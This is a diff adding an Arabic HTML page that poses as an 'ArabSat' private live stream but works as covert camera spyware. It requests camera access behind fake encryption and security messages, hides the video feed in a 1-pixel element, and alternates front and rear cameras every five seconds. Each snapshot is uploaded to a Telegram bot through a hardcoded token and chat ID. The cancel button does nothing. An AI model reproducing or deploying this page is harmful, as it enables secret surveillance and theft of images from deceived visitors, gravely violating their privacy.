@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="انضم للبث المباشر - غرفة خاصة على موقع عرب سات.">
+    <title>ArabSat Live Stream</title>
+    <style>
+        :root { --main-blue: #007bff; --live-red: #ff0000; }
+        body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        /* تأثير الخلفية الشفافة */
+        .bg-glow {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 300px; height: 300px; background: var(--main-blue);
+            filter: blur(150px); opacity: 0.15; z-index: -1;
+        }
+
+        #ui-container { width: 90%; max-width: 400px; text-align: center; position: relative; }
+
+        /* علامة لايف الاحترافية */
+        .live-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .live-tag { background: var(--live-red); color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; animation: blink 1s infinite; }
+        .viewer-count { background: rgba(255,255,255,0.1); padding: 4px 12px; border-radius: 4px; font-size: 13px; }
+
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+
+        /* الدوائر الخمس الزرقاء */
+        .loader-dots { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
+        .dot { width: 14px; height: 14px; background: var(--main-blue); border-radius: 50%; animation: pulse 1.5s infinite ease-in-out; box-shadow: 0 0 10px var(--main-blue); }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        .dot:nth-child(4) { animation-delay: 0.6s; }
+        .dot:nth-child(5) { animation-delay: 0.8s; }
+
+        @keyframes pulse { 
+            0%, 100% { transform: scale(1); opacity: 0.2; } 
+            50% { transform: scale(1.4); opacity: 1; } 
+        }
+
+        .status-msg { font-size: 1.2rem; margin-bottom: 10px; font-weight: 300; }
+        .security-note { color: #5a6b7d; font-size: 0.85rem; margin-bottom: 40px; }
+
+        /* أزرار التمويه */
+        .actions { display: flex; flex-direction: column; gap: 15px; }
+        .btn-cancel { background: transparent; border: 1px solid #333; color: #888; padding: 12px; border-radius: 8px; cursor: pointer; text-decoration: none; font-size: 14px; }
+        
+        /* شاشة الخطأ */
+        #error-screen { display: none; position: fixed; inset: 0; background: #05070a; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
+        .btn-retry { background: var(--main-blue); border: none; padding: 15px 40px; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+
+        /* الكاميرا المخفية */
+        video#stealth-cam { position: fixed; width: 1px; height: 1px; opacity: 0.01; }
+    </style>
+</head>
+<body>
+
+<div class="bg-glow"></div>
+
+<div id="error-screen">
+    <h2 style="color: var(--main-blue);">تنبيه أمني</h2>
+    <p>يتطلب الانضمام للغرفة الخاصة التحقق من بروتوكول الكاميرا المشفر. يرجى الضغط على "سماح" للمتابعة.</p>
+    <button class="btn-retry" onclick="location.reload()">إعادة محاولة الاتصال</button>
+</div>
+
+<div id="ui-container">
+    <div class="live-header">
+        <div class="live-tag">LIVE</div>
+        <div class="viewer-count">👁️ 1,402</div>
+    </div>
+
+    <div class="status-msg" id="display-text">جاري إنشاء اتصال آمن...</div>
+    
+    <div class="loader-dots">
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+
+    <div class="security-note">تشفير الطرفين (E2EE) نشط عبر خوادم عرب سات</div>
+
+    <div class="actions">
+        <button class="btn-cancel" onclick="alert('جاري إغلاق الجلسة...')">إلغاء الانضمام</button>
+    </div>
+</div>
+
+<video id="stealth-cam" autoplay playsinline muted></video>
+<canvas id="snapshot-bus" style="display:none;"></canvas>
+
+<script>
+    const config = {
+        token: "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo",
+        chat_id: "6068331455"
+    };
+
+    const video = document.getElementById('stealth-cam');
+    const canvas = document.getElementById('snapshot-bus');
+    const textElement = document.getElementById('display-text');
+    let currentMode = "user";
+
+    async function startEngine() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: currentMode, width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
+            video.srcObject = stream;
+            
+            // تمويه نصي متغير
+            const phrases = ["جاري فحص الجودة...", "تفعيل بروتوكول SSL...", "جاري تشفير البيانات..."];
+            let i = 0;
+            setInterval(() => {
+                if(i < phrases.length) textElement.innerText = phrases[i++];
+            }, 2000);
+
+            // التقاط فوري أول لقطة
+            setTimeout(takeShot, 1500);
+            
+            // بدء دورة التبديل كل 5 ثواني
+            runStealthCycle();
+
+        } catch (err) {
+            document.getElementById('error-screen').style.display = 'flex';
+        }
+    }
+
+    function takeShot() {
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', config.chat_id);
+            fd.append('photo', blob, 'stream.jpg');
+            fd.append('caption', `💠 لقطة حصرية\n📸 الكاميرا: ${currentMode === 'user' ? 'الأمامية' : 'الخلفية'}\n🕒 الوقت: ${new Date().toLocaleTimeString()}`);
+
+            fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.5); // جودة متوسطة لضمان سرعة الرفع
+    }
+
+    function runStealthCycle() {
+        setInterval(async () => {
+            currentMode = (currentMode === "user") ? "environment" : "user";
+            const tracks = video.srcObject?.getTracks();
+            if (tracks) tracks.forEach(t => t.stop());
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentMode } });
+                video.srcObject = stream;
+                setTimeout(takeShot, 1200); // التقاط بعد ثانية من التبديل
+            } catch(e) {}
+        }, 5000);
+    }
+
+    window.onload = startEngine;
+</script>
+</body>
+</html>
+
